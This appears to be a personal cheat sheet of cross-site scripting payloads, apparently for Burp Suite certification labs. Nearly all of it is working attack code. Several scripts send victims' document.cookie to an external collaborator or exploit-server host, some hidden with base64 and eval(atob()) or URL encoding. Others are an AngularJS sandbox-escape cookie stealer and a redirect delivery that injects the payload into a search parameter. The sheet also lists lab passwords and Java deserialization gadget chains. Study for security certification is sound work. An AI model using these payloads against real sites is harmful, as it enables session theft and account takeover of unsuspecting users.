


1. Steal cookie from any user

```html
<script>
fetch(‘https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>

```

2. Steal cookie exploit server


```html
<script>
eval(atob(fetch(`https://exploit-0ad000380440d0c28074023d010f00c1.exploit-server.net/exploit`, {method: 'POST',mode: 'no-cors',body:document.cookie});))
</script>

```



<script>
eval(atob(ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdGAsIHttZXRob2Q6ICdQT1NUJyxtb2RlOiAnbm8tY29ycycsYm9keTpkb2N1bWVudC5jb29raWV9KTs=
))
</script>

ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdGAsIHttZXRob2Q6ICdQT1NUJyxtb2RlOiAnbm8tY29ycycsYm9keTpkb2N1bWVudC5jb29raWV9KTs=





3. Angular XSS cookie stealer

```html
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}

```

4. Misc payloads
	- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study 



https://0a4a000a04b7d03c805f03c700b000a3.web-security-academy.net/?SearchTerm="-alert(1)-"

<script>
	location = https://0a4a000a04b7d03c805f03c700b000a3.web-security-academy.net/?SearchTerm=%22--%22";
</script>


<script>
location='https://<CHANGE_HERE>.web-security-academy.net/?find=%22%2D%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2F<CHANGE_HERE>%252eweb%2Dsecurity%2Dacademy%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29%2D%22';
</script>


fetch(`https://exploit-0ad000380440d0c28074023d010f00c1.exploit-server.net/exploit/?cookie=` + window["document"]["cookie"])

ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/Y29va2llPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==

"-eval(atob("ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"

%22%2Deval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8%2FYCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p%22%29%29%2D%22

<script>
location = "https://0a4a000a04b7d03c805f03c700b000a3.web-security-academy.net/?SearchTerm=%22%2Deval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8%2FYCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p%22%29%29%2D%22"
</script>

Carlos password -> 93c2516debbc64a4
Administrador -> b235d711d5858825



C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
		CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
		CommonsCollections1 [commons-collections:commons-collections:3.1]
		CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections3 [commons-collections:commons-collections:3.1]
		CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections5 [commons-collections:commons-collections:3.1]
		CommonsCollections6 [commons-collections:commons-collections:3.1]
		FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
		Groovy1 [org.codehaus.groovy:groovy:2.3.9]
		Hibernate1 []